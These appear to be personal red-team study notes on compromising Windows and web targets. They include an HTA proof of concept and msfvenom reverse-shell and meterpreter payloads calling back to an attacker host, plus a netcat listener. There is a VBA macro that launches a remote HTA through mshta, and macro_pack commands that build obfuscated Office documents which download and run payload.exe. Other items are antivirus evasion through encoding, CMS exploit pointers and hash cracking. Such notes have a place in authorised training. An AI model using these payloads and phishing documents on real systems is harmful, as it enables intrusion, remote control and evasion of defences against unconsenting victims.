### Wordpress 6.1

- Use module `use auxiliary/scanner/http/wordpress_scanner` for scanning vuln plugin
- The specific version of Duplicator plugin have a vuln to read a file. Use `msf` module to exploit

### Httpd Apache - FlatCore CMS

The version 2.0.7 have server side vuln [Exploit-50262](https://www.exploit-db.com/exploits/50262)
- Download and run with python3 (Must have creds)

## Note
- `netstat -antp` Check open port on host
- Doesn't know what type of hash: `hash-identifier <hash>`
- Cracking `Des(Unix)` - `john --format=descrypt hash.txt`

### Pretext Phishing document

Resource:
- [Office phish template](https://github.com/martinsohn/Office-phish-templates)

### HTML Application

Application using HTML, CSS, JS to build, run in a special environment provide by Browser(IE, Edge)
- Can run independent on Windows
- IE (Internet Explorer) automatic execute HTML app with `mshta.exe` 
  - Always executed with security context of the current user.
  - HTA can have access to the local filesystem, registry and can execute ActiveX controls.
  - Allow HTA to run outside the constrains of the web browser
- The attack vector is typically classified as a Drive by Compromise technique
- They can be use for persistence and evasion

Simple HTA app

```html
<html>
    <head>
        <script>
            var payload = 'calc.exe'
            new ActiveXObject('Wscript.Shell').Run(payload)
        </script>
    </head>
    <body>
        <h1> HTA POC</h1>
        <script>
            self.close()
        </script>
    </body>
</html>
```

**Attack**:
- Generate hta payload `msfvenom -p windows/shell_reverse_tcp LHOST=<Host_ip> LPORT=4444 -f hta-psh -o shell.hta
- Set up listener `nc -nvlp 4444`
- Run the hta app on victim machine
  - Or we can create a marco to download the app and automatic open it

```vb
Sub ExecuteHTA()
    Dim url As String
    Dim command As String

    url = "URL_TO_HTA"
    command = "mshta.exe " & url

    Shell command, vbNormalFocus
End Sub
```

### Automating Marco development with MarcoPack

[Marco Pack](https://github.com/sevagas/macro_pack)

- Have obfuscate feature
- Support a lot of format

How to use:
- `marco_pack --list-formats` List supported format
- `echo "calc.exe" | marco_pack.exe -t CMD -o -G "test.doc"` Create marco open calc.exe in the `test.doc` file
  - `-o` Obfuscate
- `--list-templates` List all template of payload

Create payload with msfvenom
- `msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<Host_ip> LPORT=1234 | .\marco_pack.exe -o -G "resume.doc"` Direct inject payload to marco of file
- `msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<Host_ip> LPORT=1234 -f exe > payload.exe` -> Host the payload
  - `echo "http:\\Host_ip\payload.exe" "payload.exe" | .\marco_pack.exe -o -G "sheet.xls"` -> Generate the document to download payload and execute it

## Bypass AV

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe`

## Download from windows

`iwr -UseBasicParsing -Uri http://<Your-IP>/Dwrite.dll -OutFile .\Dwrite.dll`